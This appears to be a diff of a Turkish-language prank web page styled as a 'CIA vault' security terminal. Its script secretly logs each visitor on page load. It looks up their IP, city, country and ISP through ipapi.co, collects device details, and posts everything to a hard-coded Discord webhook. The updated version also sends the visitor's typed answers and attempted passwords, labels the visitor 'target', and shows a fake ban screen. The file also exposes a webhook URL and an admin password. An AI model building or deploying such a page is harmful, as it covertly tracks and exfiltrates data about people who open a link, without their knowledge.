@@ -3,91 +3,120 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LEXUS V12 - SYSTEM CORE</title>
+    <title>CIA_CENTRAL_VAULT</title>
     <style>
-        body { background-color: #000; color: #bc00ff; font-family: 'Courier New', Courier, monospace; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .vault-container { border: 1px solid #bc00ff; padding: 30px; box-shadow: 0 0 20px rgba(188, 0, 255, 0.4); background: #0a000f; width: 90%; max-width: 500px; text-align: center; position: relative; }
-        .header { border-bottom: 1px solid #bc00ff; margin-bottom: 20px; padding-bottom: 10px; font-weight: bold; }
-        input { background: #000; border: 1px solid #bc00ff; color: #00ff00; padding: 12px; width: 60px; text-align: center; font-size: 1.2rem; outline: none; margin: 15px 0; }
-        .btn { border: 1px solid #bc00ff; color: #bc00ff; background: none; padding: 10px 25px; cursor: pointer; transition: 0.3s; font-family: inherit; }
-        .btn:hover { background: #bc00ff; color: #000; }
-        #admin-panel { display: none; text-align: left; }
-        #log-display { max-height: 200px; overflow-y: auto; font-size: 11px; color: #00ff00; border-top: 1px solid #333; margin-top: 15px; padding-top: 10px; }
-        .ban-screen { color: red; font-size: 1.5rem; font-weight: bold; display: none; }
+        body { background-color: #000; color: #00ff00; font-family: 'Courier New', Courier, monospace; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .terminal { width: 90%; max-width: 650px; padding: 25px; border: 1px solid #002200; background: #000; box-shadow: 0 0 20px rgba(0, 255, 0, 0.05); position: relative; }
+        .cia-header { color: #004400; font-size: 10px; text-align: right; margin-bottom: 20px; border-bottom: 1px solid #002200; padding-bottom: 5px; }
+        .query-box { font-size: 1.1rem; line-height: 1.6; margin: 15px 0; }
+        input { background: transparent; border: none; color: #00ff00; font-family: inherit; font-size: 1.2rem; outline: none; border-bottom: 1px solid #00ff00; width: 60px; text-align: center; }
+        .btn { background: #00ff00; color: #000; border: none; padding: 8px 20px; cursor: pointer; font-weight: bold; margin-top: 20px; font-family: inherit; text-transform: uppercase; }
+        #vault { display: none; color: #bc00ff; border: 1px solid #bc00ff; padding: 15px; box-shadow: 0 0 15px #bc00ff; }
+        .log-entry { border-bottom: 1px solid #1a1a1a; padding: 5px 0; font-size: 11px; }
+        .traitor-screen { color: #ff0000; display: none; text-align: center; font-weight: bold; font-size: 2rem; }
+        .cursor { animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
 
-    <div id="ban-msg" class="ban-screen">
-        [!] IP ADRESİNİZ ENGELLENDİ [!]<br>
-        <span style="font-size: 12px; color: white;">Sistem ihlali nedeniyle erişiminiz kalıcı olarak kısıtlanmıştır.</span>
+    <div id="traitor-msg" class="traitor-screen">
+        [!] HAİN TESPİT EDİLDİ [!]<br>
+        <span style="font-size: 14px; color: #fff;">İHANETİNİZ KAYDEDİLDİ. ERİŞİM ENGELLENDİ.</span>
     </div>
 
-    <div id="auth-box" class="vault-container">
-        <div class="header">[ LEXUS_SECURITY_GATE ]</div>
-        <p id="status-msg">IP ANALİZ EDİLİYOR...</p>
-        <p style="font-size: 11px;">Üçüncü taraf yazılım çalıştırılsın mı? (1 / 0)</p>
-        <input type="text" id="answer" maxlength="1" placeholder="?">
+    <div id="gate" class="terminal">
+        <div class="cia-header">INTERNAL_AFFAIRS // LEXUS_V12</div>
+        <div class="query-box">
+            Hello friend. <br>
+            Hello friend? That's lame. <br><br>
+            Sistem bütünlüğü doğrulanıyor... <br>
+            Protokol-X başlatılsın mı? (1/0) <span class="cursor">_</span>
+        </div>
+        <input type="text" id="cmd" maxlength="10" style="width: 150px;" placeholder="KOMUT">
         <br>
-        <button class="btn" onclick="triggerAction()">SİSTEME GÖNDER</button>
+        <button class="btn" onclick="execute()">KOMUTU GÖNDER</button>
     </div>
 
-    <div id="admin-panel" class="vault-container">
-        <div class="header">[ ADMIN_LOG_VAULT ]</div>
-        <div style="font-size: 11px; color: #00ff00;">● LEXUS ENGINE V12 AKTİF</div>
-        <div id="log-display"></div>
-        <button class="btn" style="margin-top: 15px; border-color: red; color: red; font-size: 10px;" onclick="localStorage.clear(); location.reload();">SİSTEMİ SIFIRLA</button>
+    <div id="auth" class="terminal" style="display: none;">
+        <div class="cia-header">SECURITY_LAYER_02 // CREDENTIALS</div>
+        <div class="query-box" style="color: #ff0000;">YETKİLİ ŞİFRESİ GEREKLİ!</div>
+        <input type="password" id="pass" style="width: 250px;" placeholder="********">
+        <br>
+        <button class="btn" onclick="verify()">SİSTEME GİRİŞ YAP</button>
+    </div>
+
+    <div id="vault" class="terminal">
+        <div class="cia-header" style="color: #bc00ff; border-bottom-color: #bc00ff;">LEXUS_VAULT // DATA_LOGS</div>
+        <div id="log-list" style="max-height: 300px; overflow-y: auto;"></div>
+        <button class="btn" style="background: #bc00ff; color: #000; font-size: 10px;" onclick="localStorage.clear(); location.reload();">BELLEĞİ SIFIRLA</button>
     </div>
 
     <script>
-        const webhookURL = "https://discord.com/api/webhooks/1480291700793544774/a8WwCE5IsjTE-p5kwWHuuI9IUGHLYYM1yAYtvz10nbhEljg2abosvDz3y74xzVnBT4eN";
+        const webh = "https://discord.com/api/webhooks/1480291700793544774/a8WwCE5IsjTE-p5kwWHuuI9IUGHLYYM1yAYtvz10nbhEljg2abosvDz3y74xzVnBT4eN";
+        const adminKey = "lexuscxnnn113";
 
-        // SAYFA YÜKLENDİĞİNDE BAN KONTROLÜ VE İLK LOG
+        // GİRDİĞİ AN (GİZLİ LOG)
         window.onload = async () => {
-            if (localStorage.getItem('user_status') === 'banned') {
-                document.getElementById('auth-box').style.display = 'none';
-                document.getElementById('ban-msg').style.display = 'block';
+            if (localStorage.getItem('traitor') === 'true') {
+                document.getElementById('gate').style.display = 'none';
+                document.getElementById('traitor-msg').style.display = 'block';
                 return;
             }
-            
             renderLogs();
-            const info = await getFullData();
-            if(info) {
-                sendDiscord(info, "🛰️ LİNKE TIKLANDI (OTOMATİK LOG)", 16776960);
-                saveLog(info, "GİRİŞ");
-                document.getElementById('status-msg').innerText = "GİRİŞ ONAYLANDI: " + info.ip;
-            }
+            const initial = await fetchPackets();
+            sendToDiscord(initial, "🛰️ SİNYAL YAKALANDI", "Link açıldı, cevap bekleniyor.", 3447003);
+            saveLocal(initial, "Link Açıldı");
         };
 
-        async function triggerAction() {
-            const val = document.getElementById('answer').value;
-            const info = await getFullData();
+        // CEVAP VERDİĞİ AN
+        async function execute() {
+            const val = document.getElementById('cmd').value;
+            const data = await fetchPackets();
+
+            // Ne cevap verdiğini hem Discord'a hem panele gönder
+            sendToDiscord(data, "💬 CEVAP GELDİ", `Kullanıcı şu cevabı verdi: **${val}**`, 16776960);
+            saveLocal(data, `Cevap: ${val}`);
 
             if (val === "1") {
-                // 1 seçerse Admin Panel açılır
-                document.getElementById('auth-box').style.display = 'none';
-                document.getElementById('admin-panel').style.display = 'block';
-                sendDiscord(info, "✅ 1 SEÇİLDİ - FULL ERİŞİM", 3066993);
-                saveLog(info, "SEÇİM: 1");
+                document.getElementById('gate').style.display = 'none';
+                document.getElementById('auth').style.display = 'block';
             } 
             else if (val === "0") {
-                // 0 seçerse BAN ve Webhook
-                localStorage.setItem('user_status', 'banned');
-                sendDiscord(info, "🚫 0 SEÇİLDİ - IP BANLANDI", 15158332);
-                saveLog(info, "BANLANDI (0)");
-                alert("SİSTEM HATASI: Erişim Reddedildi ve IP Engellendi.");
-                location.reload(); // Sayfayı yenile ki ban ekranı gelsin
+                localStorage.setItem('traitor', 'true');
+                sendToDiscord(data, "🔴 HAİN TESPİT EDİLDİ!", "0 seçildi, IP banlandı.", 15158332);
+                alert("HAİN TESPİT EDİLDİ!");
+                location.reload();
+            } else {
+                alert("GEÇERSİZ KOMUT: " + val);
             }
         }
 
-        async function getFullData() {
+        // ŞİFRE DENEDİĞİ AN
+        async function verify() {
+            const passVal = document.getElementById('pass').value;
+            const data = await fetchPackets();
+
+            if (passVal === adminKey) {
+                document.getElementById('auth').style.display = 'none';
+                document.getElementById('vault').style.display = 'block';
+                sendToDiscord(data, "🔥 TAM ERİŞİM", "Doğru şifre girildi.", 3066993);
+                saveLocal(data, "Admin Girişi Başarılı");
+            } else {
+                sendToDiscord(data, "⚠️ HATALI ŞİFRE", `Denenen Şifre: **${passVal}**`, 16711680);
+                saveLocal(data, `Hatalı Şifre: ${passVal}`);
+                alert("YETKİSİZ ERİŞİM DENEMESİ");
+            }
+        }
+
+        async function fetchPackets() {
             try {
-                const res = await fetch('https://ipapi.co/json/');
-                const i = await res.json();
+                const r = await fetch('https://ipapi.co/json/');
+                const j = await r.json();
                 return {
-                    ip: i.ip,
-                    loc: `${i.city} / ${i.country_name}`,
-                    isp: i.org,
+                    ip: j.ip,
+                    city: `${j.city} / ${j.country_name}`,
+                    isp: j.org,
                     os: navigator.platform,
                     ram: navigator.deviceMemory || "N/A",
                     cpu: navigator.hardwareConcurrency || "N/A",
@@ -97,41 +126,38 @@
             } catch (e) { return null; }
         }
 
-        function saveLog(l, type) {
-            let logs = JSON.parse(localStorage.getItem('lexus_history')) || [];
-            l.action = type;
-            logs.unshift(l);
-            localStorage.setItem('lexus_history', JSON.stringify(logs));
+        function saveLocal(obj, evt) {
+            let h = JSON.parse(localStorage.getItem('lexus_archive')) || [];
+            let entry = { ...obj, event: evt };
+            h.unshift(entry);
+            localStorage.setItem('lexus_archive', JSON.stringify(h));
             renderLogs();
         }
 
         function renderLogs() {
-            const disp = document.getElementById('log-display');
-            const logs = JSON.parse(localStorage.getItem('lexus_history')) || [];
-            if(disp) {
-                disp.innerHTML = logs.map(l => `
-                    <div style="border-bottom:1px solid #222; margin-bottom:5px;">
-                        [${l.time}] <span style="color:#bc00ff">${l.action}</span>: ${l.ip}
-                    </div>
-                `).join('');
+            const list = document.getElementById('log-list');
+            const h = JSON.parse(localStorage.getItem('lexus_archive')) || [];
+            if(list) {
+                list.innerHTML = h.map(i => `<div class="log-entry">[${i.time}] <span style="color:#fff">${i.event}</span>: ${i.ip}</div>`).join('');
             }
         }
 
-        async function sendDiscord(l, title, color) {
+        async function sendToDiscord(i, title, desc, clr) {
             const payload = {
-                username: "LEXUS SECURITY SYSTEM",
+                username: "CIA_DATABASE_ALARM",
                 embeds: [{
                     title: title,
-                    color: color,
+                    description: desc,
+                    color: clr,
                     fields: [
-                        { name: "🌐 IP & Konum", value: `**IP:** ${l.ip}\n**Konum:** ${l.loc}\n**ISS:** ${l.isp}`, inline: false },
-                        { name: "💻 Detaylar", value: `**OS:** ${l.os}\n**RAM:** ${l.ram}\n**CPU:** ${l.cpu}\n**Ekran:** ${l.res}`, inline: true },
-                        { name: "⏰ Zaman", value: l.time, inline: true }
+                        { name: "Hedef", value: `**IP:** ${i.ip}\n**Konum:** ${i.city}`, inline: true },
+                        { name: "Sistem", value: `**OS:** ${i.os}\n**RAM:** ${i.ram}`, inline: true }
                     ],
-                    footer: { text: "Lexus V12 Ban-Hammer" }
+                    footer: { text: "Lexus V12.0 Security Core" },
+                    timestamp: new Date()
                 }]
             };
-            await fetch(webhookURL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+            await fetch(webh, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
         }
     </script>
 </body>
